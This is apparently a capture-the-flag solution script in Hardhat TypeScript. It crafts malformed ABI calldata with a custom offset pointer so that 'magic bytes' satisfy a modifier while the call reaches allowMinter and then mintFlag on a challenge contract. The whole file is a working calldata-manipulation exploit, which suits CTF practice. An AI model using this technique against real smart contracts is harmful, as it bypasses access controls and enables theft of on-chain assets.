import { ethers } from "hardhat";

const solveS2Challenge7 = async (hre: any) => {
  const { deployer } = await hre.getNamedAccounts();
  const challengeAddress = "0x9959a27Ad0eF8681C0DBAA9c44971F027e575aa6";
  const signer = await ethers.getSigner(deployer);

  const mintFlagSig = "5df5e201";
  const allowMinterSig = "13d8a11e";

  // This function builds a "Sliding Window" calldata:
  // Offset 0-3: mint(bytes) selector
  // Offset 4-35: Custom Pointer (0x64) pointing to byte 100
  // Offset 68-71: MAGIC BYTES (Passes the modifier)
  // Offset 132-135: Internal target selector (allowMinter or mintFlag)
  const buildPayload = (targetSig: string) => {
    return (
      "0x66430c51" + // mint(bytes)
      "0000000000000000000000000000000000000000000000000000000000000064" + // Pointer to data (Index 100)
      "0000000000000000000000000000000000000000000000000000000000000000" + // Padding
      mintFlagSig.padEnd(64, "0") + // <--- Index 68: MAGIC BYTES
      "0000000000000000000000000000000000000000000000000000000000000004" + // Length of bytes (4)
      targetSig.padEnd(64, "0") // Content of bytes
    );
  };

  console.log("-------------------------------------------------------");
  console.log("🔓 Step 1: Whitelisting via allowMinter()...");
  const tx1 = await signer.sendTransaction({
    to: challengeAddress,
    data: buildPayload(allowMinterSig),
    gasLimit: 300000,
  });
  await tx1.wait();
  console.log("✅ tx.origin whitelisted.");

  console.log("🚀 Step 2: Minting Flag via mintFlag()...");
  const tx2 = await signer.sendTransaction({
    to: challengeAddress,
    data: buildPayload(mintFlagSig),
    gasLimit: 300000,
  });
  await tx2.wait();

  console.log("✨ SUCCESS: Flag #8 Captured.");
};

export default solveS2Challenge7;
solveS2Challenge7.tags = ["S2Challenge8"];
